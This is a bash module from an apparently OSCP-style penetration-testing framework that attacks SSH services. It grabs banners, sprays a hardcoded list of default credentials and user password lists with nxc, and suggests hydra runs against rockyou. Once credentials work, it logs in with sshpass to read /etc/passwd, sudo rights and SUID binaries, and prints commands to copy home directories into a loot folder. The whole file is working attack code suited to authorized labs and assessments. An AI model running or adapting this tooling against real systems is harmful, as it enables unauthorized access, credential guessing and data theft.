#!/bin/bash
# MODULE: ssh.sh - SSH enumeration, banner grab, credential spray
# Uses fast Python-based banner grabbing (ncscanner approach) + nxc ssh spray

# ── SSH banner grab via Python (instant — SSH sends banner on connect) ─────────
_ssh_grab_banner() {
    local _ip="$1"
    local _port="${2:-22}"
    # ncscanner-style: raw TCP connect, read banner, return version string
    python3 - "$_ip" "$_port" << 'PYEOF' 2>/dev/null
import socket, sys
host, port = sys.argv[1], int(sys.argv[2])
try:
    s = socket.socket()
    s.settimeout(3)
    s.connect((host, port))
    banner = s.recv(256).decode('utf-8', errors='ignore').strip()
    s.close()
    print(banner)
except:
    pass
PYEOF
}

# ── Detect OS from SSH banner ──────────────────────────────────────────────────
_ssh_detect_os() {
    local _banner="$1"
    if echo "$_banner" | grep -qi "windows\|Windows_"; then
        echo "Windows"
    elif echo "$_banner" | grep -qi "ubuntu\|debian\|centos\|fedora\|alpine\|kali"; then
        echo "Linux"
    elif echo "$_banner" | grep -qi "OpenSSH"; then
        echo "Linux"   # OpenSSH without Windows tag = almost certainly Linux
    else
        echo "Unknown"
    fi
}

# ── Main SSH enumeration function ─────────────────────────────────────────────
ssh_enum() {
    CURRENT_PHASE="PHASE_SSH"
    local _ssh_tgt; _ssh_tgt=$(get_proto_targets "ssh")
    [[ -z "$_ssh_tgt" ]] && return 0

    echo -e "\n${MAGENTA}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║  SSH ENUMERATION                                          ║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════╝${NC}\n"

    local _ssh_ip; [[ -f "$_ssh_tgt" ]] && _ssh_ip=$(head -1 "$_ssh_tgt") || _ssh_ip="$_ssh_tgt"
    local _ssh_port="${PROTO_PORTS[ssh]:-22}"

    # ── Step 1: Banner grab (fast Python socket, ncscanner technique) ─────────
    echo -e "${CYAN}[*] SSH Banner grab (port ${_ssh_port})...${NC}"
    show_cmd "python3 -c \"import socket; s=socket.socket(); s.settimeout(3); s.connect(('$_ssh_ip',$_ssh_port)); print(s.recv(256).decode(errors='ignore')); s.close()\""
    local _banner; _banner=$(_ssh_grab_banner "$_ssh_ip" "$_ssh_port")

    if [[ -n "$_banner" ]]; then
        echo -e "${GREEN}[+] SSH Banner: ${WHITE}${_banner}${NC}"
        echo "$_banner" > "$OUTDIR/ssh_banner.txt"
    else
        echo -e "${YELLOW}[!] No banner received (host may filter banner)${NC}"
        # Try nxc ssh as fallback for version info
        run_cmd "sudo nxc ssh $_ssh_ip" "$OUTDIR/ssh_version.txt"
        _banner=$(grep -oP 'SSH-[^\s]+' "$OUTDIR/ssh_version.txt" 2>/dev/null | head -1)
    fi

    # ── Step 2: OS detection from banner ──────────────────────────────────────
    local _ssh_os; _ssh_os=$(_ssh_detect_os "$_banner")
    local _is_windows=false
    [[ "$_ssh_os" == "Windows" ]] && _is_windows=true

    echo -e "${CYAN}[*] Detected OS: ${WHITE}${_ssh_os}${NC}  (from SSH banner)"
    echo -e "${CYAN}[*] SSH version: ${WHITE}$(echo "$_banner" | grep -oP 'OpenSSH[_\w.]+' | head -1)${NC}"
    echo ""

    # ── Step 3: Check supported auth methods ──────────────────────────────────
    echo -e "${CYAN}[*] Checking SSH auth methods...${NC}"
    show_cmd "ssh -v -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 $_ssh_ip 2>&1 | grep 'authentications that can continue'"
    local _authmethods
    _authmethods=$(ssh -v -o BatchMode=yes -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 "$_ssh_ip" 2>&1 | grep -i "authentications that can continue" | head -1)
    if [[ -n "$_authmethods" ]]; then
        echo -e "${GREEN}[+] Auth methods: ${WHITE}${_authmethods}${NC}"
        echo "$_authmethods" >> "$OUTDIR/ssh_banner.txt"
    fi

    # ── Step 4: Host key fingerprint ──────────────────────────────────────────
    echo -e "\n${CYAN}[*] SSH host key fingerprint...${NC}"
    show_cmd "ssh-keyscan -t rsa,ecdsa,ed25519 -p $_ssh_port $_ssh_ip 2>/dev/null"
    local _hostkeys
    _hostkeys=$(ssh-keyscan -t rsa,ecdsa,ed25519 -p "$_ssh_port" "$_ssh_ip" 2>/dev/null | grep -v "^#")
    if [[ -n "$_hostkeys" ]]; then
        echo "$_hostkeys" | head -5
        echo "$_hostkeys" > "$OUTDIR/ssh_hostkeys.txt"
        echo -e "${GRAY}  Saved to: $OUTDIR/ssh_hostkeys.txt${NC}"
    fi
    echo ""

    # ── Step 5: Default credential check (OSCP-safe) ─────────────────────────
    # Skip if Phase 6 spray already found SSH creds for this target
    local _ssh_already_pwned=false
    if [[ -s "$CREDS_FILE" ]]; then
        while IFS='|' read -r _cp _cip _cd _cu _cs _cpwn _ctype _cai; do
            [[ "${_cp^^}" != "SSH" ]] && continue
            [[ "$_cip" != "$_ssh_ip" ]] && continue
            _ssh_already_pwned=true; break
        done < "$CREDS_FILE"
    fi

    local _ssh_defaults=("root:root" "root:toor" "root:password" "root:" "admin:admin"
                         "admin:password" "admin:" "ubuntu:ubuntu" "pi:raspberry"
                         "vagrant:vagrant" "ansible:ansible" "git:git" "postgres:postgres")
    local _ssh_got_access="$_ssh_already_pwned"
    local _ssh_default_tmp="$OUTDIR/ssh_default_tmp.txt"

    if [[ "$_ssh_already_pwned" == true ]]; then
        echo -e "${GRAY}[○] SSH default check skipped — creds already confirmed in Phase 6 spray${NC}"
        echo ""
    else
        echo -e "${RED}[!] SSH default credential check...${NC}"
        for _mc in "${_ssh_defaults[@]}"; do
            local _mu="${_mc%%:*}" _mp="${_mc#*:}"
            : > "$_ssh_default_tmp"
            run_cmd "sudo nxc ssh $_ssh_ip -u '$_mu' -p '$_mp'" "$_ssh_default_tmp"
            if grep -q "\[+\]" "$_ssh_default_tmp" 2>/dev/null; then
                echo -e "${RED}╔═══════════════════════════════════════════════════════════╗${NC}"
                echo -e "${RED}║  SSH DEFAULT CREDENTIALS CONFIRMED                        ║${NC}"
                echo -e "${RED}╚═══════════════════════════════════════════════════════════╝${NC}"
                echo -e "${RED}    User: ${_mu}   Password: ${_mp:-<empty>}${NC}"
                echo ""
                _emit_ssh_access_commands "$_ssh_ip" "$_ssh_port" "$_mu" "$_mp" "" "$_ssh_os"
                grep -qF "SSH|$_ssh_ip||${_mu}|${_mp}" "$CREDS_FILE" 2>/dev/null || \
                    echo "SSH|$_ssh_ip||${_mu}|${_mp}|no|password|shell" >> "$CREDS_FILE"
                _ssh_got_access=true
                break
            fi
        done
        [[ "$_ssh_got_access" == false ]] && echo -e "${GRAY}  → No SSH default credentials found${NC}"
        echo ""
    fi

    # ── Step 6: Credential spray (if creds provided) ─────────────────────────
    if [[ "$HAS_PASSWORDS" == true ]] && [[ -n "$SPRAY_USERS" ]]; then
        echo -e "${CYAN}[*] SSH password spray...${NC}"
        run_cmd_process "sudo nxc ssh $_ssh_tgt -u '$SPRAY_USERS' -p '$PASSWORDS' --continue-on-success" "password"
        echo ""
    fi

    if [[ "$HAS_HASHES" == true ]] && [[ -n "$SPRAY_USERS" ]]; then
        echo -e "${YELLOW}[!] SSH hash spray skipped — SSH uses passwords/keys, not NTLM hashes${NC}"
        echo -e "${GRAY}    → If you have a password hash, crack it first: hashcat/john${NC}"
        echo ""
    fi

    # ── Step 7: If creds in CREDS_FILE, do post-auth enum ─────────────────────
    local _ssh_cred_user="" _ssh_cred_pass="" _ssh_cred_found=false
    while IFS='|' read -r _cp _cip _cd _cu _cs _cpwn _ctype _cai; do
        [[ "${_cp^^}" != "SSH" ]] && continue
        [[ "$_cip" != "$_ssh_ip" ]] && continue
        _ssh_cred_user="$_cu"
        _ssh_cred_pass="$_cs"
        _ssh_cred_found=true
        break
    done < "$CREDS_FILE" 2>/dev/null

    if [[ "$_ssh_cred_found" == true ]]; then
        _ssh_post_auth "$_ssh_ip" "$_ssh_port" "$_ssh_cred_user" "$_ssh_cred_pass" "$_ssh_os"
    fi

    # ── Step 8: Key-based auth hints ──────────────────────────────────────────
    echo -e "${CYAN}[*] SSH key-based access attempts...${NC}"
    # Check CWD first (common on OSCP — id_rsa dropped in working directory)
    local _key_found=false
    for _kpath in ./id_rsa ./id_ecdsa ./id_ed25519 ./.ssh/id_rsa; do
        if [[ -f "$_kpath" ]]; then
            echo -e "${WHITE}  >> ssh -i '$_kpath' '${_ssh_cred_user:-USER}@$_ssh_ip'  # key found in CWD!${NC}"
            echo -e "${WHITE}  >> chmod 600 '$_kpath' && ssh -i '$_kpath' '${_ssh_cred_user:-USER}@$_ssh_ip'${NC}"
            _key_found=true
        fi
    done
    # Also check ~/.ssh
    for _kpath in ~/.ssh/id_rsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519; do
        if [[ -f "$_kpath" ]]; then
            echo -e "${GRAY}    >> ssh -i $_kpath ${_ssh_cred_user:-USER}@$_ssh_ip  # (key in ~/.ssh)${NC}"
        fi
    done
    if [[ "$_key_found" == false ]]; then
        echo -e "${GRAY}    >> ssh-keygen -t rsa -b 4096 -f ./id_rsa_pentest  # generate key${NC}"
        echo -e "${GRAY}    >> ssh -i ./id_rsa USER@$_ssh_ip  # if you have the target's private key${NC}"
    fi
    echo ""

    # ── Step 9: Hydra SSH suggestion ──────────────────────────────────────────
    if [[ -f "$SPRAY_USERS" && -f "$PASSWORDS" ]]; then
        echo -e "${CYAN}[*] Hydra SSH spray command:${NC}"
        echo -e "${WHITE}  >> hydra -L '$SPRAY_USERS' -P '$PASSWORDS' -t 4 -f ssh://$_ssh_ip${NC}"
        echo -e "${GRAY}  >> hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://$_ssh_ip${NC}"
    fi
    echo ""
}

# ── Post-auth SSH enumeration ──────────────────────────────────────────────────
_ssh_post_auth() {
    local _ip="$1" _port="$2" _user="$3" _pass="$4" _os="$5"
    echo -e "\n${RED}[!] SSH credentials confirmed${NC}"
    echo -e "${RED}    ${_user}:${_pass:-<empty>} @ ${_ip}:${_port}${NC}\n"

    local _sshcmd="sshpass -p '$_pass' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 '${_user}@${_ip}' -p ${_port}"

    # Basic identity
    # Run identity check — show command, capture output, print if non-empty
    local _sshout
    show_cmd "$_sshcmd 'id 2>/dev/null; whoami; hostname'"
    _sshout=$(eval "$_sshcmd 'id 2>/dev/null; whoami; hostname'" 2>/dev/null || true)
    [[ -n "$_sshout" ]] && echo "$_sshout" | head -5 | tee "$OUTDIR/ssh_whoami.txt"

    if [[ "$_os" == "Windows" ]]; then
        echo -e "${CYAN}[*] Windows SSH target — run these to enumerate:${NC}"
        show_cmd "$_sshcmd 'whoami /all'"
        show_cmd "$_sshcmd 'ipconfig /all'"
        show_cmd "$_sshcmd 'net user'"
        show_cmd "$_sshcmd 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"'"
        local _whoami_out
        _whoami_out=$(eval "$_sshcmd 'whoami /all'" 2>/dev/null || true)
        if [[ -n "$_whoami_out" ]]; then
            echo "$_whoami_out" | head -20
            echo "$_whoami_out" > "$OUTDIR/ssh_whoami_full.txt"
        fi
    else
        echo -e "${CYAN}[*] Linux SSH target — running enumeration:${NC}"
        run_cmd "$_sshcmd 'uname -a; cat /etc/os-release 2>/dev/null | head -3'" "$OUTDIR/ssh_os_info.txt"
        run_cmd "$_sshcmd 'cat /etc/passwd | grep -v nologin | grep -v false'" "$OUTDIR/ssh_users.txt"
        run_cmd "$_sshcmd 'sudo -l 2>/dev/null'" "$OUTDIR/ssh_sudo.txt"
        run_cmd "$_sshcmd 'find / -perm -4000 -type f 2>/dev/null | head -20'" "$OUTDIR/ssh_suid.txt"
        run_cmd "$_sshcmd 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'" "$OUTDIR/ssh_ports.txt"

        # Check for interesting sudo
        if [[ -s "$OUTDIR/ssh_sudo.txt" ]] && ! grep -q "may not run sudo" "$OUTDIR/ssh_sudo.txt" 2>/dev/null; then
            echo -e "${RED}[!] SUDO RIGHTS FOUND:${NC}"
            cat "$OUTDIR/ssh_sudo.txt"
        fi
        # Check for SUID binaries
        if [[ -s "$OUTDIR/ssh_suid.txt" ]]; then
            echo -e "${RED}[!] SUID binaries found — check GTFOBins:${NC}"
            cat "$OUTDIR/ssh_suid.txt"
            echo -e "${GRAY}    >> https://gtfobins.github.io/${NC}"
        fi
    fi

}

# ── Print copy-paste SSH access commands ──────────────────────────────────────
_emit_ssh_access_commands() {
    local _ip="$1" _port="$2" _user="$3" _pass="$4" _key="$5" _os="$6"
    echo -e "${WHITE}  >> ssh '${_user}@${_ip}' -p ${_port}${_pass:+  # password: $_pass}${NC}"
    if [[ -n "$_pass" ]]; then
        echo -e "${WHITE}  >> sshpass -p '$_pass' ssh -o StrictHostKeyChecking=no '${_user}@${_ip}' -p ${_port}${NC}"
    fi
    if [[ -n "$_key" ]]; then
        echo -e "${WHITE}  >> ssh -i '$_key' '${_user}@${_ip}' -p ${_port}${NC}"
    fi
    if [[ "$_os" == "Windows" ]]; then
        echo -e "${GRAY}  >> evil-winrm -i $_ip -u '$_user' -p '${_pass:-<hash>}'  # if WinRM open${NC}"
        echo -e "${GRAY}  >> xfreerdp3 /u:'$_user' /p:'$_pass' /v:$_ip /cert:ignore  # if RDP open${NC}"
    else
        echo -e "${GRAY}  >> sshpass -p '$_pass' scp -r '${_user}@${_ip}:/home/${_user}/' ./loot/  # download home dir${NC}"
        echo -e "${GRAY}  >> sshpass -p '$_pass' ssh '${_user}@${_ip}' -p ${_port} 'sudo -l; id; uname -a'${NC}"
    fi
}
